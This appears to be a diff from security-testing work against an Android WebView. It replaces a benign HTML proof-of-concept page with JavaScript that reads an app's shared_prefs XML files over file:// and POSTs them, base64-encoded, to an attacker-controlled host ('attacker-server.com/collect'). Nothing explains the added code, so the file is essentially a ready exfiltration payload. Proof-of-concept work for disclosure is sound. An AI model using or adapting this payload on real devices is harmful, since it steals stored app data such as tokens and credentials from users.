@@ -1,16 +1,9 @@
-<!doctype html>
-<html>
-  <head>
-    <meta charset="utf-8">
-    <title>Sogexia WebView PoC</title>
-    <style>
-      body { font-family: sans-serif; padding: 40px; }
-      h1 { color: #009688; }
-    </style>
-  </head>
-  <body>
-    <h1>POC: Arbitrary URL Loaded in Sogexia WebView</h1>
-    <p><strong>Marker:</strong> poc-20251205-TEST-ABC123</p>
-    <p>This page is served over HTTPS via GitHub Pages.</p>
-  </body>
-</html>
+var req = new XMLHttpRequest();
+req.open("GET", "file:///data/data/com.zivver.app/shared_prefs/*.xml");
+req.onload = function() {
+  fetch("https://attacker-server.com/collect", {
+    method: "POST",
+    body: btoa(req.responseText)
+  });
+};
+req.send();
